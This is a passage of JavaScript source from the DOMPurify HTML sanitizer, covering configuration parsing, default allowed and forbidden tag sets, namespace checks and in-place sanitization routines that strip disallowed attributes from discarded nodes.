* @param key the configuration property to read
* @param makeFallback builds the fallback value when the option is absent
* @returns the resolved object
*/
var _resolveObjectOption = function _resolveObjectOption(cfg, key, makeFallback) {
	const value = objectHasOwnProperty(cfg, key) ? cfg[key] : void 0;
	return value && typeof value === "object" ? clone(value) : makeFallback();
};
function createDOMPurify() {
	let window = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : getGlobal();
	const DOMPurify = (root) => createDOMPurify(root);
	DOMPurify.version = "3.4.17";
	DOMPurify.removed = [];
	if (!window || !window.document || window.document.nodeType !== NODE_TYPE.document || !window.Element) {
		DOMPurify.isSupported = false;
		return DOMPurify;
	}
	let document = window.document;
	const originalDocument = document;
	const currentScript = originalDocument.currentScript;
	window.DocumentFragment;
	const HTMLTemplateElement = window.HTMLTemplateElement, Node = window.Node, Element = window.Element, NodeFilter = window.NodeFilter;
	window.NamedNodeMap === void 0 && (window.NamedNodeMap || window.MozNamedAttrMap);
	window.HTMLFormElement;
	const DOMParser = window.DOMParser, trustedTypes = window.trustedTypes;
	const ElementPrototype = Element.prototype;
	const cloneNode = lookupGetter(ElementPrototype, "cloneNode");
	const remove = lookupGetter(ElementPrototype, "remove");
	const removeAttributeNode = lookupGetter(ElementPrototype, "removeAttributeNode");
	const getNextSibling = lookupGetter(ElementPrototype, "nextSibling");
	const getChildNodes = lookupGetter(ElementPrototype, "childNodes");
	const getParentNode = lookupGetter(ElementPrototype, "parentNode");
	const getShadowRoot = lookupGetter(ElementPrototype, "shadowRoot");
	const getAttributes = lookupGetter(ElementPrototype, "attributes");
	const getNodeType = Node && Node.prototype ? lookupGetter(Node.prototype, "nodeType") : null;
	const getNodeName = Node && Node.prototype ? lookupGetter(Node.prototype, "nodeName") : null;
	const getOwnerDocument = Node && Node.prototype ? lookupGetter(Node.prototype, "ownerDocument") : null;
	const _readNodeType = function _readNodeType(node) {
		return getNodeType ? getNodeType(node) : node.nodeType;
	};
	const _readNodeName = function _readNodeName(node) {
		return getNodeName ? getNodeName(node) : node.nodeName;
	};
	const getNamespaceURI = lookupAccessor(ElementPrototype, "namespaceURI");
	const _readNamespaceURI = function _readNamespaceURI(element) {
		return getNamespaceURI ? getNamespaceURI(element) : element.namespaceURI;
	};
	if (typeof HTMLTemplateElement === "function") {
		const template = document.createElement("template");
		if (template.content && template.content.ownerDocument) document = template.content.ownerDocument;
	}
	let trustedTypesPolicy;
	let emptyHTML = "";
	let defaultTrustedTypesPolicy;
	let defaultTrustedTypesPolicyResolved = false;
	let IN_TRUSTED_TYPES_POLICY = 0;
	const _assertNotInTrustedTypesPolicy = function _assertNotInTrustedTypesPolicy() {
		if (IN_TRUSTED_TYPES_POLICY > 0) throw typeErrorCreate("A configured TRUSTED_TYPES_POLICY callback (createHTML or createScriptURL) must not call DOMPurify.sanitize, as that causes infinite recursion. Do not pass a policy whose callbacks wrap DOMPurify as TRUSTED_TYPES_POLICY; see the \"DOMPurify and Trusted Types\" section of the README.");
	};
	const _createTrustedHTML = function _createTrustedHTML(html) {
		_assertNotInTrustedTypesPolicy();
		IN_TRUSTED_TYPES_POLICY++;
		try {
			return trustedTypesPolicy.createHTML(html);
		} finally {
			IN_TRUSTED_TYPES_POLICY--;
		}
	};
	const _createTrustedScriptURL = function _createTrustedScriptURL(scriptUrl) {
		_assertNotInTrustedTypesPolicy();
		IN_TRUSTED_TYPES_POLICY++;
		try {
			return trustedTypesPolicy.createScriptURL(scriptUrl);
		} finally {
			IN_TRUSTED_TYPES_POLICY--;
		}
	};
	const _getDefaultTrustedTypesPolicy = function _getDefaultTrustedTypesPolicy() {
		if (!defaultTrustedTypesPolicyResolved) {
			defaultTrustedTypesPolicy = _createTrustedTypesPolicy(trustedTypes, currentScript);
			defaultTrustedTypesPolicyResolved = true;
		}
		return defaultTrustedTypesPolicy;
	};
	const _document = document, implementation = _document.implementation, createNodeIterator = _document.createNodeIterator, createDocumentFragment = _document.createDocumentFragment, getElementsByTagName = _document.getElementsByTagName;
	const importNode = originalDocument.importNode;
	let hooks = _createHooksMap();
	/**
	* Expose whether this browser supports running the full DOMPurify.
	*/
	DOMPurify.isSupported = typeof entries === "function" && typeof getParentNode === "function" && implementation && implementation.createHTMLDocument !== void 0;
	const MUSTACHE_EXPR$1 = MUSTACHE_EXPR, ERB_EXPR$1 = ERB_EXPR, TMPLIT_EXPR$1 = TMPLIT_EXPR, DATA_ATTR$1 = DATA_ATTR, ARIA_ATTR$1 = ARIA_ATTR, IS_SCRIPT_OR_DATA$1 = IS_SCRIPT_OR_DATA, ATTR_WHITESPACE$1 = ATTR_WHITESPACE, CUSTOM_ELEMENT$1 = CUSTOM_ELEMENT;
	let IS_ALLOWED_URI$1 = IS_ALLOWED_URI;
	/**
	* We consider the elements and attributes below to be safe. Ideally
	* don't add any new ones but feel free to remove unwanted ones.
	*/
	let ALLOWED_TAGS = null;
	const DEFAULT_ALLOWED_TAGS = addToSet({}, [
		...html$1,
		...svg$1,
		...svgFilters,
		...mathMl$1,
		...text
	]);
	let ALLOWED_ATTR = null;
	const DEFAULT_ALLOWED_ATTR = addToSet({}, [
		...html,
		...svg,
		...mathMl,
		...xml
	]);
	let CUSTOM_ELEMENT_HANDLING = Object.seal(create(null, {
		tagNameCheck: {
			writable: true,
			configurable: false,
			enumerable: true,
			value: null
		},
		attributeNameCheck: {
			writable: true,
			configurable: false,
			enumerable: true,
			value: null
		},
		allowCustomizedBuiltInElements: {
			writable: true,
			configurable: false,
			enumerable: true,
			value: false
		}
	}));
	let FORBID_TAGS = null;
	let FORBID_ATTR = null;
	const EXTRA_ELEMENT_HANDLING = Object.seal(create(null, {
		tagCheck: {
			writable: true,
			configurable: false,
			enumerable: true,
			value: null
		},
		attributeCheck: {
			writable: true,
			configurable: false,
			enumerable: true,
			value: null
		}
	}));
	let ALLOW_ARIA_ATTR = true;
	let ALLOW_DATA_ATTR = true;
	let ALLOW_UNKNOWN_PROTOCOLS = false;
	let ALLOW_SELF_CLOSE_IN_ATTR = true;
	let SAFE_FOR_TEMPLATES = false;
	let SAFE_FOR_XML = true;
	let WHOLE_DOCUMENT = false;
	let SET_CONFIG = false;
	let SET_CONFIG_ALLOWED_TAGS = null;
	let SET_CONFIG_ALLOWED_ATTR = null;
	let FORCE_BODY = false;
	let RETURN_DOM = false;
	let RETURN_DOM_FRAGMENT = false;
	let RETURN_TRUSTED_TYPE = false;
	let SANITIZE_DOM = true;
	let SANITIZE_NAMED_PROPS = false;
	const SANITIZE_NAMED_PROPS_PREFIX = "user-content-";
	let KEEP_CONTENT = true;
	let IN_PLACE = false;
	let IN_PLACE_VISITED = null;
	let USE_PROFILES = {};
	let FORBID_CONTENTS = null;
	const DEFAULT_FORBID_CONTENTS = addToSet({}, [
		"annotation-xml",
		"audio",
		"colgroup",
		"desc",
		"foreignobject",
		"head",
		"iframe",
		"math",
		"mi",
		"mn",
		"mo",
		"ms",
		"mtext",
		"noembed",
		"noframes",
		"noscript",
		"plaintext",
		"script",
		"selectedcontent",
		"style",
		"svg",
		"template",
		"thead",
		"title",
		"video",
		"xmp"
	]);
	let DATA_URI_TAGS = null;
	const DEFAULT_DATA_URI_TAGS = addToSet({}, [
		"audio",
		"video",
		"img",
		"source",
		"image",
		"track"
	]);
	let URI_SAFE_ATTRIBUTES = null;
	const DEFAULT_URI_SAFE_ATTRIBUTES = addToSet({}, [
		"alt",
		"class",
		"for",
		"id",
		"label",
		"name",
		"pattern",
		"placeholder",
		"role",
		"summary",
		"title",
		"value",
		"style",
		"xmlns"
	]);
	const MATHML_NAMESPACE = "http://www.w3.org/1998/Math/MathML";
	const SVG_NAMESPACE = "http://www.w3.org/2000/svg";
	const HTML_NAMESPACE = "http://www.w3.org/1999/xhtml";
	let NAMESPACE = HTML_NAMESPACE;
	let IS_EMPTY_INPUT = false;
	let ALLOWED_NAMESPACES = null;
	const DEFAULT_ALLOWED_NAMESPACES = addToSet({}, [
		MATHML_NAMESPACE,
		SVG_NAMESPACE,
		HTML_NAMESPACE
	], stringToString);
	const DEFAULT_MATHML_TEXT_INTEGRATION_POINTS = freeze([
		"mi",
		"mo",
		"mn",
		"ms",
		"mtext"
	]);
	let MATHML_TEXT_INTEGRATION_POINTS = addToSet({}, DEFAULT_MATHML_TEXT_INTEGRATION_POINTS);
	const DEFAULT_HTML_INTEGRATION_POINTS = freeze(["annotation-xml"]);
	let HTML_INTEGRATION_POINTS = addToSet({}, DEFAULT_HTML_INTEGRATION_POINTS);
	const COMMON_SVG_AND_HTML_ELEMENTS = addToSet({}, [
		"title",
		"style",
		"font",
		"a",
		"script"
	]);
	let PARSER_MEDIA_TYPE = null;
	const SUPPORTED_PARSER_MEDIA_TYPES = ["application/xhtml+xml", "text/html"];
	const DEFAULT_PARSER_MEDIA_TYPE = "text/html";
	let transformCaseFunc = null;
	let CONFIG = null;
	const formElement = document.createElement("form");
	const isRegexOrFunction = function isRegexOrFunction(testValue) {
		return testValue instanceof RegExp || testValue instanceof Function;
	};
	/**
	* _parseConfig
	*
	* @param cfg optional config literal
	*/
	const _parseConfig = function _parseConfig() {
		let cfg = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
		if (CONFIG && CONFIG === cfg) return;
		if (!cfg || typeof cfg !== "object") cfg = {};
		cfg = clone(cfg);
		PARSER_MEDIA_TYPE = SUPPORTED_PARSER_MEDIA_TYPES.indexOf(cfg.PARSER_MEDIA_TYPE) === -1 ? DEFAULT_PARSER_MEDIA_TYPE : cfg.PARSER_MEDIA_TYPE;
		transformCaseFunc = PARSER_MEDIA_TYPE === "application/xhtml+xml" ? stringToString : stringToLowerCase;
		ALLOWED_TAGS = _resolveSetOption(cfg, "ALLOWED_TAGS", DEFAULT_ALLOWED_TAGS, { transform: transformCaseFunc });
		ALLOWED_ATTR = _resolveSetOption(cfg, "ALLOWED_ATTR", DEFAULT_ALLOWED_ATTR, { transform: transformCaseFunc });
		ALLOWED_NAMESPACES = _resolveSetOption(cfg, "ALLOWED_NAMESPACES", DEFAULT_ALLOWED_NAMESPACES, { transform: stringToString });
		URI_SAFE_ATTRIBUTES = _resolveSetOption(cfg, "ADD_URI_SAFE_ATTR", DEFAULT_URI_SAFE_ATTRIBUTES, {
			transform: transformCaseFunc,
			base: DEFAULT_URI_SAFE_ATTRIBUTES
		});
		DATA_URI_TAGS = _resolveSetOption(cfg, "ADD_DATA_URI_TAGS", DEFAULT_DATA_URI_TAGS, {
			transform: transformCaseFunc,
			base: DEFAULT_DATA_URI_TAGS
		});
		FORBID_CONTENTS = _resolveSetOption(cfg, "FORBID_CONTENTS", DEFAULT_FORBID_CONTENTS, { transform: transformCaseFunc });
		FORBID_TAGS = _resolveSetOption(cfg, "FORBID_TAGS", clone({}), { transform: transformCaseFunc });
		FORBID_ATTR = _resolveSetOption(cfg, "FORBID_ATTR", clone({}), { transform: transformCaseFunc });
		USE_PROFILES = objectHasOwnProperty(cfg, "USE_PROFILES") ? cfg.USE_PROFILES && typeof cfg.USE_PROFILES === "object" ? clone(cfg.USE_PROFILES) : cfg.USE_PROFILES : false;
		ALLOW_ARIA_ATTR = cfg.ALLOW_ARIA_ATTR !== false;
		ALLOW_DATA_ATTR = cfg.ALLOW_DATA_ATTR !== false;
		ALLOW_UNKNOWN_PROTOCOLS = cfg.ALLOW_UNKNOWN_PROTOCOLS || false;
		ALLOW_SELF_CLOSE_IN_ATTR = cfg.ALLOW_SELF_CLOSE_IN_ATTR !== false;
		SAFE_FOR_TEMPLATES = cfg.SAFE_FOR_TEMPLATES || false;
		SAFE_FOR_XML = cfg.SAFE_FOR_XML !== false;
		WHOLE_DOCUMENT = cfg.WHOLE_DOCUMENT || false;
		RETURN_DOM = cfg.RETURN_DOM || false;
		RETURN_DOM_FRAGMENT = cfg.RETURN_DOM_FRAGMENT || false;
		RETURN_TRUSTED_TYPE = cfg.RETURN_TRUSTED_TYPE || false;
		FORCE_BODY = cfg.FORCE_BODY || false;
		SANITIZE_DOM = cfg.SANITIZE_DOM !== false;
		SANITIZE_NAMED_PROPS = cfg.SANITIZE_NAMED_PROPS || false;
		KEEP_CONTENT = cfg.KEEP_CONTENT !== false;
		IN_PLACE = cfg.IN_PLACE || false;
		IS_ALLOWED_URI$1 = isRegex(cfg.ALLOWED_URI_REGEXP) ? cfg.ALLOWED_URI_REGEXP : IS_ALLOWED_URI;
		NAMESPACE = typeof cfg.NAMESPACE === "string" ? cfg.NAMESPACE : HTML_NAMESPACE;
		MATHML_TEXT_INTEGRATION_POINTS = _resolveObjectOption(cfg, "MATHML_TEXT_INTEGRATION_POINTS", () => addToSet({}, DEFAULT_MATHML_TEXT_INTEGRATION_POINTS));
		HTML_INTEGRATION_POINTS = _resolveObjectOption(cfg, "HTML_INTEGRATION_POINTS", () => addToSet({}, DEFAULT_HTML_INTEGRATION_POINTS));
		const customElementHandling = _resolveObjectOption(cfg, "CUSTOM_ELEMENT_HANDLING", () => create(null));
		CUSTOM_ELEMENT_HANDLING = create(null);
		if (objectHasOwnProperty(customElementHandling, "tagNameCheck") && isRegexOrFunction(customElementHandling.tagNameCheck)) CUSTOM_ELEMENT_HANDLING.tagNameCheck = customElementHandling.tagNameCheck;
		if (objectHasOwnProperty(customElementHandling, "attributeNameCheck") && isRegexOrFunction(customElementHandling.attributeNameCheck)) CUSTOM_ELEMENT_HANDLING.attributeNameCheck = customElementHandling.attributeNameCheck;
		if (objectHasOwnProperty(customElementHandling, "allowCustomizedBuiltInElements") && typeof customElementHandling.allowCustomizedBuiltInElements === "boolean") CUSTOM_ELEMENT_HANDLING.allowCustomizedBuiltInElements = customElementHandling.allowCustomizedBuiltInElements;
		seal(CUSTOM_ELEMENT_HANDLING);
		if (SAFE_FOR_TEMPLATES) ALLOW_DATA_ATTR = false;
		if (RETURN_DOM_FRAGMENT) RETURN_DOM = true;
		if (USE_PROFILES) {
			ALLOWED_TAGS = addToSet({}, text);
			ALLOWED_ATTR = create(null);
			if (USE_PROFILES.html === true) {
				addToSet(ALLOWED_TAGS, html$1);
				addToSet(ALLOWED_ATTR, html);
			}
			if (USE_PROFILES.svg === true) {
				addToSet(ALLOWED_TAGS, svg$1);
				addToSet(ALLOWED_ATTR, svg);
				addToSet(ALLOWED_ATTR, xml);
			}
			if (USE_PROFILES.svgFilters === true) {
				addToSet(ALLOWED_TAGS, svgFilters);
				addToSet(ALLOWED_ATTR, svg);
				addToSet(ALLOWED_ATTR, xml);
			}
			if (USE_PROFILES.mathMl === true) {
				addToSet(ALLOWED_TAGS, mathMl$1);
				addToSet(ALLOWED_ATTR, mathMl);
				addToSet(ALLOWED_ATTR, xml);
			}
		}
		EXTRA_ELEMENT_HANDLING.tagCheck = null;
		EXTRA_ELEMENT_HANDLING.attributeCheck = null;
		if (objectHasOwnProperty(cfg, "ADD_TAGS")) {
			if (typeof cfg.ADD_TAGS === "function") EXTRA_ELEMENT_HANDLING.tagCheck = cfg.ADD_TAGS;
			else if (arrayIsArray(cfg.ADD_TAGS)) {
				if (ALLOWED_TAGS === DEFAULT_ALLOWED_TAGS) ALLOWED_TAGS = clone(ALLOWED_TAGS);
				addToSet(ALLOWED_TAGS, cfg.ADD_TAGS, transformCaseFunc);
			}
		}
		if (objectHasOwnProperty(cfg, "ADD_ATTR")) {
			if (typeof cfg.ADD_ATTR === "function") EXTRA_ELEMENT_HANDLING.attributeCheck = cfg.ADD_ATTR;
			else if (arrayIsArray(cfg.ADD_ATTR)) {
				if (ALLOWED_ATTR === DEFAULT_ALLOWED_ATTR) ALLOWED_ATTR = clone(ALLOWED_ATTR);
				addToSet(ALLOWED_ATTR, cfg.ADD_ATTR, transformCaseFunc);
			}
		}
		if (objectHasOwnProperty(cfg, "ADD_FORBID_CONTENTS") && arrayIsArray(cfg.ADD_FORBID_CONTENTS)) {
			if (FORBID_CONTENTS === DEFAULT_FORBID_CONTENTS) FORBID_CONTENTS = clone(FORBID_CONTENTS);
			addToSet(FORBID_CONTENTS, cfg.ADD_FORBID_CONTENTS, transformCaseFunc);
		}
		if (KEEP_CONTENT) ALLOWED_TAGS["#text"] = true;
		if (WHOLE_DOCUMENT) addToSet(ALLOWED_TAGS, [
			"html",
			"head",
			"body"
		]);
		if (ALLOWED_TAGS.table) {
			addToSet(ALLOWED_TAGS, ["tbody"]);
			delete FORBID_TAGS.tbody;
		}
		if (cfg.TRUSTED_TYPES_POLICY) {
			if (typeof cfg.TRUSTED_TYPES_POLICY.createHTML !== "function") throw typeErrorCreate("TRUSTED_TYPES_POLICY configuration option must provide a \"createHTML\" hook.");
			if (typeof cfg.TRUSTED_TYPES_POLICY.createScriptURL !== "function") throw typeErrorCreate("TRUSTED_TYPES_POLICY configuration option must provide a \"createScriptURL\" hook.");
			const previousTrustedTypesPolicy = trustedTypesPolicy;
			trustedTypesPolicy = cfg.TRUSTED_TYPES_POLICY;
			try {
				emptyHTML = _createTrustedHTML("");
			} catch (error) {
				trustedTypesPolicy = previousTrustedTypesPolicy;
				throw error;
			}
		} else if (cfg.TRUSTED_TYPES_POLICY === null) {
			trustedTypesPolicy = void 0;
			emptyHTML = "";
		} else {
			if (trustedTypesPolicy === void 0) trustedTypesPolicy = _getDefaultTrustedTypesPolicy();
			if (trustedTypesPolicy && typeof emptyHTML === "string") emptyHTML = _createTrustedHTML("");
		}
		if (freeze) freeze(cfg);
		CONFIG = cfg;
	};
	const ALL_SVG_TAGS = addToSet({}, [
		...svg$1,
		...svgFilters,
		...svgDisallowed
	]);
	const ALL_MATHML_TAGS = addToSet({}, [...mathMl$1, ...mathMlDisallowed]);
	/**
	* Namespace rules for an element in the SVG namespace.
	*
	* @param tagName the element's lowercase tag name
	* @param parent the (possibly simulated) parent node
	* @param parentTagName the parent's lowercase tag name
	* @returns true if a spec-compliant parser could produce this element
	*/
	const _checkSvgNamespace = function _checkSvgNamespace(tagName, parent, parentTagName) {
		if (parent.namespaceURI === HTML_NAMESPACE) return tagName === "svg";
		if (parent.namespaceURI === MATHML_NAMESPACE) return tagName === "svg" && (parentTagName === "annotation-xml" || MATHML_TEXT_INTEGRATION_POINTS[parentTagName]);
		return Boolean(ALL_SVG_TAGS[tagName]);
	};
	/**
	* Namespace rules for an element in the MathML namespace.
	*
	* @param tagName the element's lowercase tag name
	* @param parent the (possibly simulated) parent node
	* @param parentTagName the parent's lowercase tag name
	* @returns true if a spec-compliant parser could produce this element
	*/
	const _checkMathMlNamespace = function _checkMathMlNamespace(tagName, parent, parentTagName) {
		if (parent.namespaceURI === HTML_NAMESPACE) return tagName === "math";
		if (parent.namespaceURI === SVG_NAMESPACE) return tagName === "math" && HTML_INTEGRATION_POINTS[parentTagName];
		return Boolean(ALL_MATHML_TAGS[tagName]);
	};
	/**
	* Namespace rules for an element in the HTML namespace.
	*
	* @param tagName the element's lowercase tag name
	* @param parent the (possibly simulated) parent node
	* @param parentTagName the parent's lowercase tag name
	* @returns true if a spec-compliant parser could produce this element
	*/
	const _checkHtmlNamespace = function _checkHtmlNamespace(tagName, parent, parentTagName) {
		if (parent.namespaceURI === SVG_NAMESPACE && !HTML_INTEGRATION_POINTS[parentTagName]) return false;
		if (parent.namespaceURI === MATHML_NAMESPACE && !MATHML_TEXT_INTEGRATION_POINTS[parentTagName]) return false;
		return !ALL_MATHML_TAGS[tagName] && (COMMON_SVG_AND_HTML_ELEMENTS[tagName] || !ALL_SVG_TAGS[tagName]);
	};
	/**
	* @param element a DOM element whose namespace is being checked
	* @returns Return false if the element has a
	*  namespace that a spec-compliant parser would never
	*  return. Return true otherwise.
	*/
	const _checkValidNamespace = function _checkValidNamespace(element) {
		const elementNamespace = _readNamespaceURI(element);
		const tagName = stringToLowerCase(_readNodeName(element));
		const parentNode = getParentNode(element);
		let parent;
		let parentTagName;
		if (parentNode && _readNodeType(parentNode) === NODE_TYPE.element) {
			parent = { namespaceURI: _readNamespaceURI(parentNode) };
			parentTagName = stringToLowerCase(_readNodeName(parentNode));
		} else {
			parent = { namespaceURI: NAMESPACE };
			parentTagName = "template";
		}
		if (!ALLOWED_NAMESPACES[elementNamespace]) return false;
		if (elementNamespace === SVG_NAMESPACE) return _checkSvgNamespace(tagName, parent, parentTagName);
		if (elementNamespace === MATHML_NAMESPACE) return _checkMathMlNamespace(tagName, parent, parentTagName);
		if (elementNamespace === HTML_NAMESPACE) return _checkHtmlNamespace(tagName, parent, parentTagName);
		if (PARSER_MEDIA_TYPE === "application/xhtml+xml" && ALLOWED_NAMESPACES[elementNamespace]) return true;
		return false;
	};
	/**
	* _forceRemove
	*
	* @param node a DOM node
	*/
	const _forceRemove = function _forceRemove(node) {
		arrayPush(DOMPurify.removed, { element: node });
		try {
			getParentNode(node).removeChild(node);
		} catch (_) {
			remove(node);
			if (!getParentNode(node)) throw typeErrorCreate("a node selected for removal could not be detached from its tree and cannot be safely returned; refusing to sanitize in place");
		}
	};
	/**
	* _stripAttributeNode
	*
	* Remove a single Attr node case/namespace-exactly on an attribute-teardown
	* path. Name-based removeAttribute() ASCII-lowercases its lookup key for an
	* HTML element in an HTML document and so silently misses a case-preserved
	* handler (e.g. `ONERROR` off an XML/XHTML import) - the same defect
	* _removeAttribute() was fixed for, which a name-based call would reintroduce
	* on these IN_PLACE teardown paths. Unlike _removeAttribute this does not
	* record into DOMPurify.removed: the neutralize passes intentionally do not
	* book-keep. A clobbered/detached node falls back to best-effort name-based
	* removal.
	*
	* @param element the element to strip the attribute from
	* @param attribute the Attr node to remove
	* @param name the attribute's name, for the fallback path
	*/
	const _stripAttributeNode = function _stripAttributeNode(element, attribute, name) {
		try {
			removeAttributeNode(element, attribute);
		} catch (_) {
			try {
				element.removeAttribute(name);
			} catch (_) {}
		}
	};
	/**
	* Fail-closed teardown of an in-place root: strip every disallowed attribute
	* in the subtree first, so nothing armed is left behind, then remove all
	* children and the root's own attributes.
	*
	* @param root the in-place root to empty
	*/
	const _neutralizeRoot = function _neutralizeRoot(root) {
		_neutralizeSubtree(root);
		const childNodes = getChildNodes(root);
		if (childNodes) arrayForEach(arraySlice(childNodes), (child) => {
			try {
				remove(child);
			} catch (_) {}
		});
		const attributes = _readNodeType(root) === NODE_TYPE.element ? getAttributes(root) : null;
		if (attributes) for (let i = attributes.length - 1; i >= 0; --i) {
			const attribute = attributes[i];
			const name = attribute && attribute.name;
			if (typeof name === "string") _stripAttributeNode(root, attribute, name);
		}
	};
	/**
	* Removes an attribute, preferably as its exact Attr node: name-based
	* removal lowercases the name in HTML documents and misses case-preserved
	* names, e.g. from imported XHTML.
	*
	* @param name an Attribute name
	* @param element a DOM node
	* @param attr the exact Attr node to remove, when the caller has it
	*/
	const _removeAttribute = function _removeAttribute(name, element, attr) {
		if (!attr) try {
			attr = element.getAttributeNode(name);
		} catch (_) {
			attr = null;
		}
		arrayPush(DOMPurify.removed, {
			attribute: attr || null,
			from: element
		});
		try {
			if (attr) removeAttributeNode(element, attr);
			else element.removeAttribute(name);
		} catch (_) {
			try {
				element.removeAttribute(name);
			} catch (_) {}
		}
		if (name === "is") {
			if (RETURN_DOM || RETURN_DOM_FRAGMENT) try {
				_forceRemove(element);
			} catch (_) {}
			else try {
				element.setAttribute(name, "");
			} catch (_) {}
		}
	};
	/**
	* Removes every attribute the configuration does not allow. Used to
	* neutralize nodes discarded from an in-place tree.
	*
	* @param element the element to strip
	*/
	const _stripDisallowedAttributes = function _stripDisallowedAttributes(element) {
		const attributes = getAttributes(element);
		if (!attributes) return;
		for (let i = attributes.length - 1; i >= 0; --i) {
			const attribute = attributes[i];
			const name = attribute && attribute.name;
			if (typeof name !== "string" || ALLOWED_ATTR[transformCaseFunc(name)]) continue;
			_stripAttributeNode(element, attribute, name);
		}
	};
	/**
	* Iterative depth-first walk, so deep trees cannot overflow the call stack,
	* reading through the cached getters, so clobbering cannot hide children.
	* When `visit` returns false, the node's children are skipped. With
	* `intoShadow`, open shadow roots are walked after their host's children.
	*
	* @param root where to start
	* @param visit called for every node
	* @param intoShadow whether to enter open shadow roots
	*/
	const _walkTree = function _walkTree(root, visit) {
		let intoShadow = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : false;
		const stack = [root];
		while (stack.length > 0) {
			const node = stack.pop();
			if (visit(node) === false) continue;
			if (intoShadow && _readNodeType(node) === NODE_TYPE.element) {
				const shadowRoot = getShadowRoot(node);
				if (_isDocumentFragment(shadowRoot)) stack.push(shadowRoot);
			}
			const childNodes = getChildNodes(node);
			if (childNodes) for (let i = childNodes.length - 1; i >= 0; --i) stack.push(childNodes[i]);
		}
	};
	/**
	* Strips disallowed attributes from every element of a discarded subtree,
	* so a handler that is already queued (a loading image) cannot fire.
	*
	* @param root the root of a removed subtree
	*/
	const _neutralizeSubtree = function _neutralizeSubtree(root) {
		_walkTree(root, (node) => {
			if (_readNodeType(node) === NODE_TYPE.element) _stripDisallowedAttributes(node);
		});
	};
	/**
	* All nodes under `root`, root first, including open shadow roots. Template
	* content is not entered, it is inert.
	*
	* @param root the in-place root
	* @return the nodes
	*/
	const _collectLiveNodes = function _collectLiveNodes(root) {
		const nodes = [];
		_walkTree(root, (node) => {
			nodes.push(node);
		}, true);
		return nodes;
	};
	/**
	* Strips disallowed attributes from every element that was under the
	* in-place root when the call started and no longer is, whatever removed
	* or moved it.
	*
	* @param root the in-place root
	* @param before the root's nodes, collected before the walk
	*/
	const _neutralizeEscapedElements = function _neutralizeEscapedElements(root, before) {
		const reachable = setCreate();
		arrayForEach(_collectLiveNodes(root), (node) => {
			if (_readNodeType(node) === NODE_TYPE.element) setAdd(reachable, node);
		});
		arrayForEach(before, (node) => {
			if (_readNodeType(node) === NODE_TYPE.element && !setHas(reachable, node)) _stripDisallowedAttributes(node);
		});
	};
	/**
	* Neutralizes everything that left the in-place tree during the call: what
	* DOMPurify removed, and what hooks or custom elements removed or moved out.
	*
	* @param root the in-place root
	* @param before the root's nodes, collected before the walk
	* @return true if the root itself was removed
	*/
	const _neutralizeDiscarded = function _neutralizeDiscarded(root, before) {
		let rootRemoved = false;
		arrayForEach(DOMPurify.removed, (entry) => {
			if (entry.element) {
				rootRemoved = rootRemoved || entry.element === root;
				_neutralizeSubtree(entry.element);
			}
		});
		_neutralizeEscapedElements(root, before);
		return rootRemoved;
	};
	const MAX_UNVISITED_ROUNDS = 8;
	/**
	* The walk only moves forward, so a node moved to a position it already
	* passed is never visited. Give every original node that is still in the
	* tree but unvisited the normal treatment, hooks included. Nodes created
	* during the call are left alone. Fails closed if the tree keeps changing.
	*
	* @param root the in-place root
	* @param before the root's nodes, collected before the walk
	*/
	const _sanitizeUnvisitedNodes = function _sanitizeUnvisitedNodes(root, before) {
		const visited = IN_PLACE_VISITED;
		let original = null;
		const getOriginal = () => {
			if (!original) {
				original = setCreate();
				arrayForEach(before, (beforeNode) => {
					setAdd(original, beforeNode);
				});
			}
			return original;
		};
		for (let round = 0;; round++) {
			const live = _collectLiveNodes(root);
			const containers = [root];
			let pending = false;
			arrayForEach(live, (node) => {
				if (_readNodeType(node) === NODE_TYPE.documentFragment) arrayPush(containers, node);
				else if (!pending && !setHas(visited, node)) pending = setHas(getOriginal(), node);
			});
			if (!pending) return;
			if (round >= MAX_UNVISITED_ROUNDS) throw typeErrorCreate("the tree kept changing during in-place sanitization; refusing to return it");
			arrayForEach(containers, (container, index) => {
				_sanitizeUnvisitedIn(container, index > 0, root, getOriginal());
			});
		}
	};
	/**
	* One _sanitizeUnvisitedNodes pass over the root or an open shadow root.
	*
	* @param container the root or an open shadow root
	* @param inShadow whether container is a shadow root
	* @param root the in-place root
	* @param original the root's nodes collected before the walk, as a set
	*/
	const _sanitizeUnvisitedIn = function _sanitizeUnvisitedIn(container, inShadow, root, original) {
		const iterator = _createNodeIterator(container);
		let node;
		while (node = iterator.nextNode()) {
			if (!setHas(original, node) || setHas(IN_PLACE_VISITED, node)) continue;
			if (inShadow) _executeHooks(hooks.uponSanitizeShadowNode, node, null);
			_sanitizeElements(node, root);
			_sanitizeAttributes(node, root);
			if (_isDocumentFragment(node.content)) _sanitizeShadowDOM2(node.content);
		}
	};
	/**
	* Records that _sanitizeElements processed `node`. No-op outside IN_PLACE.
	*
	* @param node the node being processed
	*/
	const _markVisited = function _markVisited(node) {
		if (IN_PLACE_VISITED) setAdd(IN_PLACE_VISITED, node);
	};
	/**
	* Patch-linkage attributes (declarative partial updates): `patchsrc`
	* always, `for` everywhere except on <label> and <output>. Gated on
	* SAFE_FOR_XML. Shared by the IN_PLACE pre-pass and _isValidAttribute.
	*
	* @param lcName the transformCaseFunc'd attribute name
	* @param lcTag the transformCaseFunc'd tag name of the carrying element
	* @return true if the attribute is patch linkage and must be dropped
	*/
	const _isPatchLinkageAttribute = function _isPatchLinkageAttribute(lcName, lcTag) {
		if (!SAFE_FOR_XML) return false;
		if (lcName === "patchsrc") return true;
		return lcName === "for" && lcTag !== "label" && lcTag !== "output";
	};
	/**
	* IN_PLACE pre-pass: sever all patch linkage before the walk, so no patch
	* can fire mid-walk into a part of the tree the walker already passed.
	* Removes range markers (processing instructions, comments with markup)
	* and strips linkage attributes. It cannot undo a patch that already fired.
	*
	* TODO: if the shipped feature can patch through `for` on <label>/<output>,
	* drop that pair here too (see test/declarative-patch-probe.html).
	*
	* @param root the in-place root to sweep
	*/
	const _neutralizePatchLinkage = function _neutralizePatchLinkage(root) {
		if (!SAFE_FOR_XML) return;
		_walkTree(root, (node) => {
			const nodeType = _readNodeType(node);
			if (nodeType === NODE_TYPE.processingInstruction || nodeType === NODE_TYPE.comment && regExpTest(COMMENT_MARKUP_PROBE, node.data)) {
				try {
					remove(node);
				} catch (_) {}
				return false;
			}
			if (nodeType === NODE_TYPE.element) {
				const element = node;
				const lcTag = transformCaseFunc(_readNodeName(node));
				try {
